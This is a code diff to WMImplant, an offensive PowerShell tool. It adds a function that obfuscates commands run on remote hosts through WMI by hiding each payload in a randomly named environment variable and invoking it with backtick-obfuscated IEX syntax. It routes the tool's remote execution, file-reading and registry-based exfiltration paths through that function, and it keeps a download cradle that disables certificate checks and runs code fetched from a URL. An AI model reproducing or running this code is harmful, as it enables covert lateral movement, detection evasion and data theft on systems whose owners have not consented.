@@ -3,8 +3,107 @@
 <#
     WMImplant v1.0
     License: GPLv3
-    Author: @ChrisTruncer and @evan_pena2003
+    Author: @ChrisTruncer
 #>
+
+function Invoke-WMIObfuscatedPSCommand
+{
+    param
+    (
+        [Parameter(Mandatory = $False)]
+        [System.Management.Automation.PSCredential]$Creds,
+        [Parameter(Mandatory = $True)]
+        [String]$PSCommand,
+        [Parameter(Mandatory = $True)]
+        [String]$Target,
+        [Parameter(Mandatory = $False)]
+        [Switch]$ObfuscateWithEnvVar
+    )
+
+    Process
+    {
+        # Generate randomized and obfuscated syntax for retrieving PowerShell command from an environment variable if $ObfuscateWithEnvVar flag was defined.
+        if($ObfuscateWithEnvVar)
+        {
+            # Create random alphanumeric environment variable name.
+            $VarName = -join (Get-Random -Input ((((65..90) + (97..122) | % {[char]$_})) + (0..9)) -Count 5)
+
+            # Randomly select obfuscated syntax for invoking the contents of the randomly-named environment variable.
+            # More complete obfuscation options can be imported from Invoke-Obfuscation.
+            $DGGetChildItemSyntaxRandom = Get-Random -Input @('Get-C`hildItem','Child`Item','G`CI','DI`R','L`S')
+            $DGGetCommandSyntaxRandom   = Get-Random -Input @('Get-C`ommand','Co`mmand','G`CM')
+            $DGInvokeSyntaxRandom       = Get-Random -Input @('IE`X','Inv`oke-Ex`pression',".($DGGetCommandSyntaxRandom ('{1}e{0}'-f'x','i'))")
+        
+            $DGEnvVarSyntax       = @()
+            $DGEnvVarSyntax      += "(" + $DGGetChildItemSyntaxRandom + " env:$VarName).Value"
+            $DGEnvVarSyntax      += "`$env:$VarName"
+            $DGEnvVarSyntaxRandom = (Get-Random -Input $DGEnvVarSyntax)
+
+            $DGInvokeEnvVarSyntax       = @()
+            $DGInvokeEnvVarSyntax      += $DGInvokeSyntaxRandom + ' ' + $DGEnvVarSyntaxRandom
+            $DGInvokeEnvVarSyntax      += $DGEnvVarSyntaxRandom + '|' + $DGInvokeSyntaxRandom
+            $DGInvokeEnvVarSyntaxRandom = (Get-Random -Input $DGInvokeEnvVarSyntax)
+
+            $PSCommandForCommandLine = $DGInvokeEnvVarSyntaxRandom
+        }
+        Else
+        {
+            $PSCommandForCommandLine = $PSCommand
+        }
+
+        # Set final PowerShell command to be executed by WMI.
+        $ObfuscatedCommand = "powershell $PSCommandForCommandLine"
+
+        # Extract username if $Creds were specified. Otherwise use current username.
+        if($Creds)
+        {
+            $Username = $Creds.UserName
+        }
+        else
+        {
+            $Username = $env:USERNAME
+        }
+
+        # Set PowerShell command in an environment variable if $ObfuscateWithEnvVar flag was defined.
+        if($ObfuscateWithEnvVar)
+        {
+            $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username}
+        }
+
+        # Launch PowerShell command.
+        if($Creds)
+        {
+            $null = Invoke-WmiMethod -Class Win32_Process -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $Target
+        }
+        else
+        {
+            $null = Invoke-WmiMethod -Class Win32_Process -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $Target
+        }
+
+        # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
+        if($ObfuscateWithEnvVar)
+        {
+            $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" | Remove-WmiObject
+        }
+
+        <#DELETE BELOW BLOCK FOR FINAL RELEASE#>
+        $ShowFunFactsForPOV = $TRUE
+        if($ShowFunFactsForPOV -AND $ObfuscateWithEnvVar)
+        {
+            Write-Host "`n`nHere's what just happened:" -ForegroundColor White
+            Write-Host "Random env var NAME :: " -NoNewLine -ForegroundColor White
+            Write-Host $VarName -ForegroundColor Cyan
+            Write-Host "Env var VALUE       :: " -NoNewLine -ForegroundColor White
+            Write-Host $PSCommand -ForegroundColor Cyan
+            Write-Host "PS cmdline launcher :: " -NoNewLine -ForegroundColor White
+            Write-Host $ObfuscatedCommand -ForegroundColor Green
+        }
+        <#DELETE ABOVE BLOCK FOR FINAL RELEASE#>
+
+    } # End of Process Block
+    end{}
+} # End of Function block
+
 
 function Disable-WinRMWMI
 {
@@ -369,15 +468,14 @@ function Get-InstalledPrograms
         # On remote system, save file to registry
         Write-Verbose "Running remote command and writing on remote registry"
         $remote_command = '$fct = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string; $fctenc=[Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
-        $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
 
         if($Creds)
         {
-            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
         Write-Verbose "Sleeping to let remote system store the information"
@@ -610,19 +708,17 @@ function Invoke-CommandExecution
         $encoded_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
         $encoded_command += ' New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $EncodedText -PropertyType String -Force'
 
-        $Command = 'powershell -nop -exec bypass -c "'
-        $Command += "$encoded_command"
-        $Command += '"'
+        $remote_command = $encoded_command
 
         Write-Verbose "Running command on remote system..."
 
         if($Creds)
         {
-            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
         # Grab file from remote system's registry
@@ -648,7 +744,7 @@ function Invoke-CommandExecution
         if($Creds)
         {
             $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-        }''
+        }
         else
         {
             $dummyvalue = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
@@ -935,6 +1031,7 @@ function Invoke-CommandGeneration
                 }
             }
             $Command
+
         }
 
         "remote_posh"
@@ -1805,22 +1902,24 @@ function Invoke-RemoteScriptWithOutput
 
         Write-Verbose "Building PowerShell command"
 
-        $Command = 'powershell -nop -exec bypass -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
+        $Command = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
         $Command += "'$Url'"
         $Command += ')); $output = '
         $Command += "$Function;"
         $Command += ' $bytes = [System.Text.Encoding]::Ascii.GetBytes($output); $EncodedText = [Convert]::ToBase64String($bytes);'
         $Command += ' New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $EncodedText -PropertyType String -Force'
 
+        $remote_command = $Command
+
         Write-Verbose "Running command on remote system..."
 
         if($Creds)
         {
-            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            $dummyvalue = Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
         # Grab file from remote system's registry
@@ -3881,15 +3980,14 @@ function Get-FileContentsWMImplant
         # On remote system, save file to registry
         Write-Verbose "Reading remote file and writing on remote registry"
         $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
-        $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
 
         if($Creds)
         {
-            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
         }
 
         Write-Verbose "Sleeping to let remote system read and store file"
@@ -4000,16 +4098,17 @@ function Invoke-FileTransferWMImplant
             # On remote system, save file to registry
             Write-Verbose "Reading remote file and writing on remote registry"
             $remote_command = '$fct = Get-Content -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
-            $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
 
             if($Creds)
             {
-                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
             }
             else
             {
-                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
             }
+
+
 
             Write-Verbose "Sleeping to let remote system read and store file"
             Start-Sleep -s 30
@@ -4086,15 +4185,16 @@ function Invoke-FileTransferWMImplant
             # grabs registry value and saves to disk
             Write-Verbose "Connecting to $Target"
             $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; $decode = [char[]][int[]]$out.sValue.Split('','') -Join ''''; Set-Content -Path ' + "$Upload_Dir" + ' -Value $decode'
-            $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'
-           
+            
+            $remote_command = $remote_posh
+
             if($Creds)
             {
-                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -Credential $Creds -ComputerName $Target
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
             }
             else
             {
-                Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_posh -ComputerName $Target
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
             }
 
             Write-Verbose "Sleeping to let remote system execute WMI command"
